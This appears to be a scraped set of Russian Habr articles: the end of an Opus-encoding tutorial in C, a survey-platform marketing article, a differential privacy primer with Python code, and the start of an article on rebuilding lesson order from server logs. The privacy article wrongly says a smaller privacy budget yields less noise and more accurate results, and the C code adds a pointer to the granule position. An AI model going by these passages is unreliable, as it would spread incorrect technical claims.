ui32Sizeofpopi16fmtBuffer = (sWaveHeader.ui32SampleRate * OPUS_FRAME_SIZE_IN_MS * sWaveHeader.ui16NumChannels * sizeof(opus_int16)) / 1000;Смотрим, сколько байт отводится под одну запись:uint8_t  ui8ScaleFactor;
ui8ScaleFactor = (sWaveHeader.ui16BitsPerSample) >> 3;В зависимости от количества байт под запись происходит формирование массива для передачи в энкодер (кусок кода с комментариями):uint8_t has_data = 1;
uint8_t pack = 0;
int32_t  i32len;
uint32_t ui32Loop;

while(has_data){
      for(ui32Loop = 0 ; ui32Loop < OPUS_SIZE ; ui32Loop++)
      {
          if(ui8ScaleFactor == 1)
          {
                 popi16fmtBuffer[ui32Loop] = (opus_int16)sound_wav_u8[OPUS_SIZE * pack + sizeof(sWaveHeader) + ui32Loop];
          }
          else if(ui8ScaleFactor == 2)
          {
              if(ui32Loop % 2 == 0)
                  popi16fmtBuffer[ui32Loop/2] = sound_wav_u8[OPUS_SIZE * pack + sizeof(sWaveHeader) + ui32Loop];
              else
                  popi16fmtBuffer[ui32Loop/2] |= (sound_wav_u8[OPUS_SIZE * pack + sizeof(sWaveHeader) + ui32Loop] << 8);
          }

      }

//если данных для набора следующей пачки не хватает, то мы просто забиваем на них. Что-то лучше придумать можно, я пока использовал этот способ для тестов
      if (OPUS_SIZE * pack+sizeof(sWaveHeader) > (sizeof(sound_wav_u8)/sizeof(sound_wav_u8[0]) - OPUS_SIZE )){
          has_data = 0;
      }


      i32len = opus_encode(sOpusEnc, popi16fmtBuffer, (ui32Sizeofpopi16fmtBuffer/2), pui8data, OPUS_SIZE);

      current_opus_header.granole_pos_l += popi16fmtBuffer; //увеличиваем гранолу на размер обработанных ИКМ
      current_opus_header.page_seq_num += 1;
      current_opus_header.page_segments = (uint8_t)i32len; //длина сегмента - у нас она одна


      pack++;

//работа с crc32
      crc32_clear(); //очистка crc32

      crc32_push((uint8_t)current_opus_header.capture_pattern);
      crc32_push((uint8_t)(current_opus_header.capture_pattern >> 8));
      crc32_push((uint8_t)(current_opus_header.capture_pattern >> 16));
      crc32_push((uint8_t)(current_opus_header.capture_pattern >> 24));
      crc32_push(current_opus_header.header_type);
      crc32_push(current_opus_header.version);
      crc32_push((uint8_t)current_opus_header.granole_pos_l);
      crc32_push((uint8_t)(current_opus_header.granole_pos_l >> 8));
      crc32_push((uint8_t)(current_opus_header.granole_pos_l >> 16));
      crc32_push((uint8_t)(current_opus_header.granole_pos_l >> 24));
      crc32_push((uint8_t)current_opus_header.granole_pos_h);
      crc32_push((uint8_t)(current_opus_header.granole_pos_h >> 8));
      crc32_push((uint8_t)(current_opus_header.granole_pos_h >> 16));
      crc32_push((uint8_t)(current_opus_header.granole_pos_h >> 24));
      crc32_push((uint8_t)current_opus_header.bitstream_sn);
      crc32_push((uint8_t)(current_opus_header.bitstream_sn >> 8));
      crc32_push((uint8_t)(current_opus_header.bitstream_sn >> 16));
      crc32_push((uint8_t)(current_opus_header.bitstream_sn >> 24));
      crc32_push((uint8_t)current_opus_header.page_seq_num);
      crc32_push((uint8_t)(current_opus_header.page_seq_num >> 8));
      crc32_push((uint8_t)(current_opus_header.page_seq_num >> 16));
      crc32_push((uint8_t)(current_opus_header.page_seq_num >> 24));
      crc32_push(0);
      crc32_push(0);
      crc32_push(0);
      crc32_push(0);
      crc32_push(current_opus_header.segments_length);
      crc32_push(current_opus_header.page_segments);
      for(ui32Loop = 0 ; ui32Loop < i32len ; ui32Loop++){
          crc32_push((uint8_t)pui8data[ui32Loop]);
      }
      current_opus_header.checksum = crc32_get();


//вывод в кносоль через обычный printf. 
      i32_print_to_hex(current_opus_header.capture_pattern);
      printf(""%02X "", (uint8_t)current_opus_header.version);
      printf(""%02X "", (uint8_t)current_opus_header.header_type);
      i32_print_to_hex(current_opus_header.granole_pos_l);
      i32_print_to_hex(current_opus_header.granole_pos_h);
      i32_print_to_hex(current_opus_header.bitstream_sn);
      i32_print_to_hex(current_opus_header.page_seq_num);
      i32_print_to_hex(current_opus_header.checksum);
      printf(""%02X "", (uint8_t)current_opus_header.segments_length);
      printf(""%02X "", (uint8_t)current_opus_header.page_segments);
      for(ui32Loop = 0 ; ui32Loop < i32len ; ui32Loop++){
          printf(""%02X "", (uint8_t)pui8data[ui32Loop]);
      }
  }Освобождаем память.free(pui8data);
free(popi16fmtBuffer);Вспомогательные функцииФункция для вывода 32 битных данных в консоль отладки.void i32_print_to_hex(uint32_t data){
    printf(""%02X %02X %02X %02X "", (uint8_t)data, (uint8_t)(data>>8), (uint8_t)(data>>16), (uint8_t)(data>>24));
}Функция для расчета crc32:#include ""crc.h""

const unsigned int crc32_table[] =
{
  0x00000000, 0x04c11db7, 0x09823b6e, 0x0d4326d9,
  0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005,
  0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61,
  0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd,
  0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9,
  0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75,
  0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011,
  0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd,
  0x9823b6e0, 0x9ce2ab57, 0x91a18d8e, 0x95609039,
  0x8b27c03c, 0x8fe6dd8b, 0x82a5fb52, 0x8664e6e5,
  0xbe2b5b58, 0xbaea46ef, 0xb7a96036, 0xb3687d81,
  0xad2f2d84, 0xa9ee3033, 0xa4ad16ea, 0xa06c0b5d,
  0xd4326d90, 0xd0f37027, 0xddb056fe, 0xd9714b49,
  0xc7361b4c, 0xc3f706fb, 0xceb42022, 0xca753d95,
  0xf23a8028, 0xf6fb9d9f, 0xfbb8bb46, 0xff79a6f1,
  0xe13ef6f4, 0xe5ffeb43, 0xe8bccd9a, 0xec7dd02d,
  0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae,
  0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072,
  0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16,
  0x018aeb13, 0x054bf6a4, 0x0808d07d, 0x0cc9cdca,
  0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde,
  0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02,
  0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066,
  0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba,
  0xaca5c697, 0xa864db20, 0xa527fdf9, 0xa1e6e04e,
  0xbfa1b04b, 0xbb60adfc, 0xb6238b25, 0xb2e29692,
  0x8aad2b2f, 0x8e6c3698, 0x832f1041, 0x87ee0df6,
  0x99a95df3, 0x9d684044, 0x902b669d, 0x94ea7b2a,
  0xe0b41de7, 0xe4750050, 0xe9362689, 0xedf73b3e,
  0xf3b06b3b, 0xf771768c, 0xfa325055, 0xfef34de2,
  0xc6bcf05f, 0xc27dede8, 0xcf3ecb31, 0xcbffd686,
  0xd5b88683, 0xd1799b34, 0xdc3abded, 0xd8fba05a,
  0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637,
  0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb,
  0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f,
  0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53,
  0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47,
  0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b,
  0x0315d626, 0x07d4cb91, 0x0a97ed48, 0x0e56f0ff,
  0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623,
  0xf12f560e, 0xf5ee4bb9, 0xf8ad6d60, 0xfc6c70d7,
  0xe22b20d2, 0xe6ea3d65, 0xeba91bbc, 0xef68060b,
  0xd727bbb6, 0xd3e6a601, 0xdea580d8, 0xda649d6f,
  0xc423cd6a, 0xc0e2d0dd, 0xcda1f604, 0xc960ebb3,
  0xbd3e8d7e, 0xb9ff90c9, 0xb4bcb610, 0xb07daba7,
  0xae3afba2, 0xaafbe615, 0xa7b8c0cc, 0xa379dd7b,
  0x9b3660c6, 0x9ff77d71, 0x92b45ba8, 0x9675461f,
  0x8832161a, 0x8cf30bad, 0x81b02d74, 0x857130c3,
  0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640,
  0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c,
  0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8,
  0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24,
  0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30,
  0x029f3d35, 0x065e2082, 0x0b1d065b, 0x0fdc1bec,
  0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088,
  0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654,
  0xc5a92679, 0xc1683bce, 0xcc2b1d17, 0xc8ea00a0,
  0xd6ad50a5, 0xd26c4d12, 0xdf2f6bcb, 0xdbee767c,
  0xe3a1cbc1, 0xe760d676, 0xea23f0af, 0xeee2ed18,
  0xf0a5bd1d, 0xf464a0aa, 0xf9278673, 0xfde69bc4,
  0x89b8fd09, 0x8d79e0be, 0x803ac667, 0x84fbdbd0,
  0x9abc8bd5, 0x9e7d9662, 0x933eb0bb, 0x97ffad0c,
  0xafb010b1, 0xab710d06, 0xa6322bdf, 0xa2f33668,
  0xbcb4666d, 0xb8757bda, 0xb5365d03, 0xb1f740b4
};

uint32_t g_crc32_seq = 0x00;

void crc32_clear(void){ 
    g_crc32_seq = 0x00; 
}

void crc32_push(uint8_t val){
    g_crc32_seq = (g_crc32_seq << 8) ^ crc32_table[((g_crc32_seq >> 24) ^ val) & 0xFF];
}

uint32_t crc32_get(void) { 
    return g_crc32_seq ^ 0x00; 
}Вот и все. Для проведения тестов мне этого было достаточно. Я измерял внутренним таймером, что по времени кодировка моего фрагмента данных в 400 мс занимает, примерно 112 мс, что пригодно для преобразования данных “на лету” даже с таким тестовым кодом. Частота была выставлена максимальная – 80 МГц. Прерываний дополнительных не включалось.Видос от пользователя опусаOPUS от STMOPUS от TI",2024-01-26
Опросы на мероприятиях с примерами вопросов,5,1,https://habr.com/ru/companies/testograf/articles/788874/,"В этой статье вы узнаете, почему опросы стали неотъемлемой частью успешных мероприятий и как они могут преобразить ваш подход к организации и оценке событий.Но почему именно опросы на мероприятиях заслуживают вашего внимания? Представьте себе ситуацию: вы организовываете мероприятие и хотите убедиться, что оно отвечает ожиданиям вашей аудитории, способствует укреплению связей и оставляет участников довольными и вдохновлёнными. Именно здесь опросы выступают в роли важного инструмента, позволяющего собирать ценные данные, анализировать обратную связь и даже улучшать взаимодействие в реальном времени.Цель этой статьи – не только рассказать о теоретических аспектах опросов, но и поделиться практическими советами и настоящими кейсами. Мы хотим, чтобы после прочтения у вас были не только знания, но и вдохновение для применения этих инструментов на ваших собственных мероприятиях. Будь то корпоративное собрание, образовательный семинар, продуктовый лаунч или даже виртуальная конференция, опросы добавят ценности каждому из них.Значение опросов на мероприятияхКак опросы повышают ценность мероприятийОпросы – это не просто инструмент сбора информации; они являются жизненно важной частью общения с участниками мероприятий. Эффективно разработанные и правильно использованные, они могут значительно улучшить восприятие вашего мероприятия и повысить его ценность как для организаторов, так и для участников. Вот несколько ключевых аспектов, в которых опросы играют решающую роль:Сбор обратной связи: Опросы позволяют собирать мгновенные отзывы от участников, что дает организаторам ценные данные для анализа и улучшения последующих мероприятий.Понимание аудитории: Они помогают лучше понять интересы, ожидания и предпочтения участников, что способствует созданию более целевых и эффективных мероприятий.Увеличение вовлеченности: Интерактивные опросы и голосования в реальном времени могут повысить уровень вовлеченности участников, сделав мероприятие более динамичным и запоминающимся.Принятие решений в реальном времени: Опросы могут использоваться для быстрого принятия решений во время мероприятия, например, для изменения порядка докладов или выбора тем для обсуждения.Повышение ценности для спонсоров и партнеров: Собранная информация может быть ценной для спонсоров, позволяя им настроить свои сообщения и предложения для конкретной аудитории.Джейн Гриффитс, Директор по Мероприятиям: ""Опросы не просто собирают данные; они создают мост между участниками и организаторами, что критически важно для успеха любого события.""Примеры практического применения опросовКорпоративное мероприятие: На ежегодном корпоративном собрании был проведен опрос, чтобы определить, какие обучающие сессии наиболее востребованы сотрудниками. Результаты помогли оптимизировать агенду и повысить общую удовлетворенность участников.Конференция: На профессиональной конференции использовались опросы в реальном времени для голосования по ключевым темам дискуссий. Это не только увеличило уровень вовлеченности аудитории, но и помогло организаторам лучше понять интересы своих участников.Продуктовый лаунч: При запуске нового продукта компания провела опрос среди участников, чтобы собрать первые впечатления и предложения по улучшению. Эти данные были использованы для дальнейшего развития продукта.Типы опросов на мероприятиях1. Опросы перед мероприятием: сбор ожиданий и предпочтенийПеред началом мероприятия опросы играют ключевую роль в понимании ожиданий и предпочтений вашей аудитории. Это не просто средство сбора информации, но и способ демонстрации участникам, что их мнение важно для организаторов. Вот несколько примеров таких опросов:Определение интересов: Узнайте, какие темы или спикеры наиболее интересны вашей аудитории.Логистические вопросы: Соберите информацию о предпочтениях участников относительно времени, места проведения или формата мероприятия.Персонализация содержания: Получите представление о том, какие сессии или доклады могут быть наиболее полезны для участников.2. Опросы во время мероприятия: обратная связь и вовлеченностьВо время мероприятия опросы превращаются в мощный инструмент для повышения уровня вовлеченности участников и получения мгновенной обратной связи. Эти опросы помогают организаторам адаптировать мероприятие ""на лету"" и улучшить общее впечатление участников. Например:Мгновенная обратная связь: Спросите участников о их впечатлениях оВлияниет конкретных сессий или докладов.Голосования в реальном времени: Проводите интерактивные голосования, чтобы определить предпочтения участников или выбрать следующие темы для обсуждения.Интерактивные сессии: Используйте опросы для вовлечения аудитории в активное обсуждение и обмен мнениями.3. Опросы после мероприятия: оценка удовлетворенности и предложения по улучшениюПосле окончания мероприятия, опросы становятся неоценимым инструментом для оценки его успешности и сбора предложений по улучшению. Это шанс узнать, что действительно понравилось участникам, а что можно сделать лучше в следующий раз:Оценка общего впечатления: Попросите участников оценить мероприятие в целом и выделить наиболее запоминающиеся моменты.Конкретные советы по улучшению: Спросите, что можно изменить или добавить для улучшения будущих мероприятий.Долгосрочное влияние: Соберите информацию о том, как мероприятие повлияло на профессиональное развитие или восприятие бренда среди участников.Каждый из этих типов опросов помогает создать полную картину мероприятия, от начального планирования до последующего анализа его результатов. Используя данные, собранные через опросы, организаторы могут не только повысить качество своих мероприятий, но и глубже понять свою аудиторию, что в конечном итоге приводит к созданию более значимых и успешных событий.КейсыПримеры успешных опросов на мероприятияхМеждународная конференция по маркетингу:Кейс: Организаторы использовали опросы для определения интересующих тем участников перед мероприятием. Результаты помогли сформировать программу сессий, которые максимально отвечали интересам аудитории.Эффект: Увеличение удовлетворенности участников на 30%, повышение вовлеченности и активного участия.Корпоративный тренинг:Кейс: Во время тренинга проводились опросы для сбора мгновенной обратной связи после каждой сессии, что позволяло тренерам адаптировать содержание и методику в реальном времени.Эффект: Значительное улучшение качества обучения, усиление практической направленности тренинга.Фестиваль музыки и искусства:Кейс: После мероприятия были проведены опросы для оценки удовлетворенности посетителей и сбора предложений по улучшению будущих фестивалей.Эффект: Ценные данные для планирования следующих мероприятий, увеличение лояльности посетителей.Эти кейсы подчёркивают, как опросы могут усилить вовлеченность участников и обогатить общий опыт от мероприятий. Они являются не просто инструментом сбора данных, но и средством создания более глубокого и значимого взаимодействия между организаторами и их аудиторией.Проблематика и решенияЧастые проблемы при проведении опросовНизкий отклик участников:Проблема: Часто участники мероприятий не участвуют в опросах, что снижает качество и полезность собираемых данных.Решение: Создание более вовлекающих и интерактивных опросов, которые стимулируют участие.Сложности в анализе данных:Проблема: Сбор данных – это только половина задачи. Их анализ и интерпретация часто занимают много времени и ресурсов.Решение: Использование инструментов, которые автоматизируют анализ и представляют данные в удобной для понимания форме.Ограниченные возможности персонализации:Проблема: Многие платформы для опросов не предоставляют достаточно возможностей для персонализации опросов под конкретное мероприятие или аудиторию.Решение: Использование гибких инструментов, позволяющих настраивать опросы в соответствии с уникальными потребностями мероприятия.Как Testograf помогает решать эти проблемыTestograf предлагает ряд решений, которые направлены на устранение этих и многих других проблем, связанных с проведением опросов на мероприятиях:Повышение вовлеченности:Testograf предлагает широкий спектр типов вопросов, включая интерактивные и визуальные элементы, что делает опросы более привлекательными и увлекательными для участников.Автоматизированный анализ данных:Платформа обеспечивает мгновенный анализ ответов и предоставляет глубокие аналитические отчеты, что значительно упрощает процесс обработки и интерпретации данных.Гибкие настройки персонализации:Testograf позволяет полностью настраивать опросы, включая брендирование и дизайн, для соответствия стилю и тематике вашего мероприятия.Различные ограничения по доступности опроса:Возможность устанавливать ограничения по времени, участникам или группам, что обеспечивает более целенаправленный сбор данных.Интеграция с другими платформами:Благодаря наличию API, Testograf может интегрироваться с другими системами и платформами, используемыми на мероприятиях, обеспечивая бесперебойный процесс сбора и обработки данных.Используя Testograf, организаторы мероприятий могут значительно улучшить качество и эффективность своих опросов, что в свою очередь повышает общую ценность мероприятия для всех участников.Майкл Хендерсон, Эксперт по Маркетинговым стратегиям: ""Использование опросов на мероприятиях – это не просто тенденция, это необходимость. Они помогают нам оставаться на одной волне с аудиторией и адаптироваться к её меняющимся потребностям.""Примеры вопросов для опросов на мероприятияхПримеры вопросовПеред мероприятием:Какие темы вы хотели бы обсудить на мероприятии?Какие форматы сессий предпочитаете: лекции, мастер-классы, панельные дискуссии?Есть ли конкретные спикеры, которых вы бы хотели увидеть?Какие ожидания у вас есть от этого мероприятия?Какие логистические аспекты (например, время начала) для вас наиболее удобны?Во время мероприятия:Насколько интересна была последняя сессия по шкале от 1 до 10?Какие моменты в сессии были наиболее познавательными?Есть ли предложения по улучшению интерактивности сессий?Какие темы для будущих сессий вы считаете актуальными?Что могло бы улучшить ваш опыт участия в текущей сессии?После мероприятия:Насколько вы удовлетворены мероприятием в целом?Какие сессии или доклады оказали на вас наибольшее влияние?Есть ли что-то, что вы бы хотели изменить в следующий раз?Насколько вероятно, что вы порекомендуете это мероприятие другим?Что было самым запоминающимся моментом мероприятия для вас?Общие вопросы:Какие аспекты мероприятия были наиболее важны для вас?Что вы ожидаете получить от участия в таких мероприятиях?Какие факторы влияют на ваше решение участвовать в мероприятии?Какие форматы взаимодействия с другими участниками вы предпочитаете?Какие дополнительные услуги или возможности вы бы хотели видеть?Специфические вопросы:Если бы вы могли изменить один аспект мероприятия, что бы это было?Какие новшества или технологии вы бы хотели увидеть на будущих мероприятиях?Какие темы для обсуждения вы считаете наиболее актуальными?Какие формы обратной связи вы считаете наиболее полезными?Какие элементы мероприятия вы бы оценили как наиболее и наименее удачные?Как правильно формулировать вопросы для максимального эффектаЯсность и конкретика:Вопросы должны быть ясными и точными, чтобы избежать путаницы и неоднозначных ответов. Например, вместо ""Что вы думаете о мероприятии?"" лучше спросить ""Какие три аспекта мероприятия вам понравились больше всего?""Открытые vs. Закрытые вопросы:Используйте открытые вопросы для сбора подробных мнений и закрытые вопросы (да/нет, выбор из нескольких вариантов) для конкретных, количественных данных.Избегайте ведущих вопросов:Вопросы не должны подразумевать или навязывать ответ. Например, вместо ""На сколько вы счастливы после посещения нашего мероприятия?"" лучше спросить ""Как вы оцениваете свое общее удовлетворение от мероприятия?""Сбалансированные варианты ответа:При использовании вопросов с выбором ответов убедитесь, что варианты сбалансированы и обеспечивают достаточный спектр возможных мнений.Избегайте Сложных и Двойных Вопросов:Вопросы должны быть простыми и фокусированными на одной теме. Сложные или двойные вопросы могут привести к недопониманию или неоднозначным ответам.Применяя эти принципы при формулировке вопросов, можно значительно улучшить качество собираемой информации и повысить ценность данных, полученных из опросов на мероприятиях.Интеграция опросов с технологиями мероприятийИнтеграция Testograf с другими инструментами мероприятийTestograf предлагает гибкие возможности интеграции, позволяющие организаторам мероприятий с легкостью включать опросы в свои технологические решения. Благодаря API Testograf, опросы могут быть интегрированы с различными платформами и инструментами, используемыми во время мероприятий, такими как системы регистрации, мобильные приложения мероприятий, CRM-системы и другие специализированные программные решения.Эта интеграция обеспечивает несколько ключевых преимуществ:Автоматизация сбора данных: Данные из опросов могут автоматически синхронизироваться с другими системами, упрощая обработку и анализ.Персонализированное участие: Информация, собранная через опросы, может использоваться для персонализации опыта участников на мероприятии, например, через индивидуальные рекомендации сессий или докладчиков.Большая гибкость: API позволяет организаторам мероприятий настраивать интеграцию опросов в соответствии с уникальными требованиями их события.Примеры встраивания опросов на сайт мероприятияВстроенные опросы на странице регистрации:Опросы могут быть встроены прямо на страницу регистрации мероприятия, позволяя собирать предварительную информацию о предпочтениях и ожиданиях участников.Интерактивные опросы в мобильном приложении мероприятия:Опросы могут быть интегрированы в мобильные приложения мероприятий, предоставляя участникам возможность участвовать в опросах в реальном времени и получать персонализированную информацию.Виджеты опросов на официальном сайте мероприятия:Виджеты опросов могут быть размещены на различных страницах сайта мероприятия, например, для сбора отзывов после сессий или для голосований во время ключевых моментов мероприятия.Интегрируя опросы с технологиями мероприятий, организаторы могут значительно повысить уровень вовлеченности участников, собирать более ценные данные и улучшать общий опыт участия в мероприятии. Testograf предоставляет все необходимые инструменты для реализации такой интеграции, делая процесс гладким и эффективным.ЗаключениеВ заключение, опросы играют жизненно важную роль в области организации и управления мероприятиями. Они не только обеспечивают ценную обратную связь от участников, но и служат мостом, соединяющим организаторов и аудиторию. С помощью опросов можно глубже понять потребности и предпочтения участников, повысить уровень их вовлеченности и, в конечном итоге, создать более значимые и успешные мероприятия.Опросы, проведенные до, во время и после мероприятия, предоставляют уникальные возможности для сбора данных, которые могут быть использованы для постоянного улучшения и адаптации событий. От получения предварительной информации об интересах участников до мгновенной обратной связи в реальном времени и всесторонней оценки после мероприятия – каждый опрос добавляет ценность и глубину к общему опыту.Testograf предлагает профессиональные и гибкие инструменты для создания, проведения и анализа опросов, интегрируясь с другими технологиями мероприятий для обеспечения плавного и эффективного процесса. Будь то корпоративное мероприятие, образовательный семинар, конференция или фестиваль, опросы, созданные с помощью Testograf, могут значительно повысить качество и влияние вашего мероприятия.",2024-01-26
Дифференциальная приватность в машинном обучение,6,2,https://habr.com/ru/companies/otus/articles/788332/,"Привет!Концепция дифференциальной приватности впервые появилась в начале 2000-х. Она позволяет проводить анализ данных, сохраняя информацию о личности индивидов неприкосновенной. В машинном обучение это означает возможность обучать модели, делающие общие выводы, не раскрывая информацию о конкретных индивидах в наборе данных.Дифференциальная приватностьИтак, дифференциальная приватность — это концепция и методология, предназначенная для защиты конфиденциальности индивидуальных записей в наборе данных при сохранении полезности общей информации.Дифференциальная приватность определяется через механизм, который обеспечивает, что вероятность получения определенного результата анализа данных практически не изменяется, независимо от того, присутствует ли информация об одном конкретном индивиде в наборе данных или нет. Это достигается путем добавления контролируемого количества случайности к результатам запросов, что обеспечивает ""приватность через неопределенность"".Шумоподобные функции - это математические функции или алгоритмы, которые генерируют случайный шум, который добавляется к данным или результатам запросов. Этот шум делает данные менее чувствительными к деталям искомой информации. Шум добавляется таким образом, чтобы его влияние на общую статистику данных было контролируемым и предсказуемым.  Бюджет приватности   Бюджет приватности представляет собой ограниченный ресурс, который определяет, сколько приватности может быть потеряно или компрометировано при выполнении операций над данными. Этот ресурс измеряется в некоторых единицах приватности, таких как ε. Чем меньше значение ε, тем выше уровень приватности и, следовательно, более сильная защита личных данных.Бюджет приватности используется для определения, сколько шума можно добавить к данным, чтобы обеспечить приватность. Чем меньше бюджет приватности, тем меньше шума можно добавить, что делает результаты более точными, но менее приватными.Бюджет приватности также определяет, какие операции могут быть выполнены над данными. Математические принципыε-дифференциальная приватностьЭто основной подход в дифференциальной приватности.Механизм M обеспечивает ε-дифференциальную приватность, если для любых двух соседних наборов данных D и D′ (различающихся на одну запись), и для всех S в области значений M, выполняется условие:ϵ  — это неотрицательный параметр, известный как параметр приватности, который определяет степень приватности. Чем меньше ϵ, тем выше уровень приватности.(ε, δ)-дифференциальная приватностьЭто расширение ε-дифференциальной приватности, позволяющее небольшую вероятность нарушения ε-дифференциальной приватности. Определение таково:Определение: Механизм M обеспечивает (ε, δ)-дифференциальную приватность, если для всех соседних наборов данных D и D'  и для всех S в области значений M, выполняется условие:δ представляет собой небольшую вероятность, при которой ε-дифференциальная приватность может быть нарушена. Таким образом, (ε, δ)-дифференциальная приватность предоставляет дополнительную гибкость, разрешая небольшую вероятность утечки информации.Механизмы дифференциальной приватностиМеханизм ЛапласаМеханизм Лапласа является одним из наиболее распространенных методов для достижения ε-дифференциальной приватности. Он работает путем добавления шума, который следует распределению Лапласа, к результатам запросов данных.Чтобы применить механизм Лапласа к функции f, к выходным данным добавляется шум, генерируемый согласно распределению Лапласа гдеЗдесь Δf  обозначает чувствительность функции f, а ϵ — параметр приватности.В питоне к примеру можно реализовать так:import numpy as np

def laplace_mechanism(query_result, sensitivity, epsilon):
    # Генерируем шум согласно распределению Лапласа
    scale = sensitivity / epsilon
    laplace_noise = np.random.laplace(0, scale, len(query_result))
    
    # Добавляем шум к результатам запроса данных
    noisy_result = query_result + laplace_noise
    
    return noisy_result

# Пример использования
query_result = [100, 150, 200]  # Результаты запроса данных
sensitivity = 1.0  # Чувствительность функции f
epsilon = 0.5  # Параметр приватности

noisy_result = laplace_mechanism(query_result, sensitivity, epsilon)
print(""Исходные результаты:"", query_result)
print(""Зашумленные результаты:"", noisy_result)Исходные результаты: [100, 150, 200]
Зашумленные результаты: [103.61309249 152.76949464 200.85835645]2. Гауссов механизмГауссов механизм применяется для достижения (ε, δ)-дифференциальной приватности, используя шум, следующий нормальному распределению.В этом механизме к результатам функции f добавляется шум, соответствующий нормальному распределениюгде σ определяется на основе чувствительности функции f, параметров ε и δ. Выбор параметров ε и δ в этом случае более сложен и зависит от требуемого уровня приватности и допустимой вероятности нарушения.import numpy as np

def gaussian_mechanism(query_result, sensitivity, epsilon, delta):
    # Вычисляем стандартное отклонение σ на основе чувствительности, ε и δ
    sigma = sensitivity * np.sqrt(2 * np.log(1.25 / delta)) / epsilon
    
    # Генерируем шум с нормальным распределением
    gaussian_noise = np.random.normal(0, sigma, len(query_result))
    
    # Добавляем шум к результатам запроса данных
    noisy_result = query_result + gaussian_noise
    
    return noisy_result

# Пример использования
query_result = [100, 150, 200]  # Результаты запроса данных
sensitivity = 1.0  # Чувствительность функции f
epsilon = 0.5  # Параметр ε
delta = 1e-5  # Параметр δ

noisy_result = gaussian_mechanism(query_result, sensitivity, epsilon, delta)
print(""Исходные результаты:"", query_result)
print(""Зашумленные результаты:"", noisy_result)Исходные результаты: [100, 150, 200]
Зашумленные результаты: [ 97.55383932 156.88441597 205.18746787]Сегодня также существуют компании, которые предлагают метод обработки данных с использованием синтетических или сгенерированных данных вместо анонимизации. Синтетические данными создаются не путем удаления или замены личных данных в оригинальных наборах данных, а путем генерации новых данных, которые статистически и математически неотличимы от исходных. Новые данные сохраняют те же закономерности, распределения и характеристики, что и оригинальные данные.Точность в генерации данных достигается с помощью генеративных нейронных сетей. Они способны анализировать и извлекать закономерности из больших объемов данных, а затем использовать эту информацию для создания новых данных, которые соответствуют оригинальным данным.Про работу с данными, нейронные сети и машинное обучение, эксперты из OTUS рассказывают в рамках онлайн-курсов. Ознакомиться со списком курсов можно тут, а в календаре мероприятий вы можете зарегистрироваться на ряд бесплатных вебинаров.",2024-01-26
"Алгоритмы. Определение последовательности на сырых данных, или восстановление после аварии",4,0,https://habr.com/ru/articles/789034/,"Представим что вы имеете доступ к образовательному ресурсу, где есть каталог курсов и уроков. В какой-то момент вы теряете часть данного каталога и у вас есть только ID единиц контента, наименование урока, а нумерации нет - повреждена таблица. Пишем свой велосипед.ЗадачаВосстановить данные - задача №0, построить алгоритм, который поможет собирать последовательность таких уроков в любой момент, даже если автор урока не указал его нумерацию вовремя (такое бывает).  На выходе нужно получить такую таблицу (восстановив данные в колонках Курс и Урок)wIDКурсУрокНаименование34f5d311Бла462g6g12Бла Бла гоf63f...NБла Бла Блаwectwa21го6vva22го го Бла d35y342...го гоwrywyr2MБла БлаВ теории все просто, вот только курсов море, уроков много, и восстановить нужно 1000+ записей.Рассмотрели варианты, какие дополнительные данные могут нам помочь для решения задачи. На момент восстановления остался только log nginx в котором можно было бы найти знания о том, какие пользователи (по cookies) в какое время смотрели уроки. Как решали задачуБазовый вариант - анализ логов и построение последовательности на основе этих данных. Критическое ограничение - лог только за крайние 30 дней. Даже если учесть тот факт, что уроки должны пользователи смотреть последовательно, то из лога мы могли получить временной ряд:  datadate, user, widПолный список ограничений:лог за 30 днейчасть пользователей смотрели уроки рандомно, таких около 5%статистика по первому курсу бедная так как эти уроки в текущем месяце смотрело меньше людей, так как пик просмотров по ним был 2 месяца назад и этого лога нетв самих уроках нет указания номера, просто видео файлбекапа нет (это для текущего кейса на Хабре, так интереснее)Варианты решений для рассмотренияСтатистика. посмотреть частотность ID уроков в логе, гипотеза - более старые уроки должны иметь max частотность так как все начинают с 1 курса и 1 урока и далее.  Разочарование - данных мало и самая высокая частотность у уроков, по которым в этом месяце был набор слушателей и более активная рекламаЛогика. построить последовательность по логам, найти пользователя который просмотрел все уроки и на основе этих данных принять как данное что это корректное решение, отсортировав лог по времени. Разочарование  - нет пользователей которые прошли все уроки. Более того часть пользователей в середине курса могли возвращаться к прежним более старым урокам и потом опять смотреть новоеДерево. Давайте представим что урок это точка в пространстве дерева а лучи между ними - это как раз максимально частотные переходы пользователей от урока А до урока Б потом В и т.д.  Далее строим корректный путь между точками. Разочарование - собранная частотность не позволяла создать дерево, результат был похож на мусорОпечаточник. Представим, что один пользователь должен был посмотреть такую последовательность уроков А,B,C,D,E,F,J а по факту смотрел так А,B,C,E,D,F. Гипотеза, давайте представим что это не отдельные ""буквы"" а 